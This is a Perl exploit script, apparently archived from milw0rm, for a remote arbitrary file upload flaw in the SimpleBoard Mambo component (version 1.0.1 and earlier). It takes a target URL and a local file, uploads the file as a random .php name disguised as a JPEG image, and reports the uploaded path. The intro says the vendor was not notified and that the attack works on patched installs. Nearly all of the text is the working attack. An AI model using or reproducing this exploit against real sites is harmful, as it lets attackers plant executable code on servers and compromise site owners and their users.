#!/usr/bin/perl

use warnings;
use strict;
use LWP::UserAgent;
use HTTP::Request::Common;

my $fname = rand(99999) . ".php"; # no int()

print <<INTRO;

- SimpleBoard Mambo Component <= 1.0.1 -
- Remote Arbitrary File Upload Exploit -
    
    Discovered && Coded by: t0pP8uZz
    Discovered on: 20 October 2008
    Vendor has not been notified!
    
    Note:
    
        This exploit is a completely diffrent
            method then the prior simpleboard vulns.
            which differs from the one
            located here: http://milw0rm.com/exploits/1994
            
        Same files vulnerable, But this one works with
            the patch! in later versions of
            SimpleBoard they removed the image_upload.php so
            this wont work. but this
            works on every image_upload.php version. with the
            patch in place!
            
        A common error for the exploit is if openbase_dir is
            enabled, then this means
            the file will not get uploaded due to the
            dir restrictions.
            
    - Peace
    - irc.rizon.net #sectalk

INTRO

print "\nEnter URL(ie: http://site.com/mambo): ";
    chomp(my $url=<STDIN>);
    
print "\nEnter File Path(path to local file to upload): ";
    chomp(my $file=<STDIN>);

my $ua = LWP::UserAgent->new;
my $re = $ua->request(POST $url.'/components/com_simpleboard/image_upload.php',
                      Content_Type => 'form-data',
                      Content      => [ attachimage => [ $file, $fname, Content_Type => 'image/jpeg' ], ] );

die "HTTP POST Failed!" unless $re->is_success;

if($re->content =~ /open_basedir/) {
    
    print "open_basedir restriction enabled. Exploit failed. See php.ini for more details.\n"; # say() ? get perl510
}
else {
 
    print "Looks like exploit was successfull! for uploaded file check:  " . $url . "/components/com_simpleboard/" . $fname . "\n";   
}
exit;

# milw0rm.com [2008-10-29]
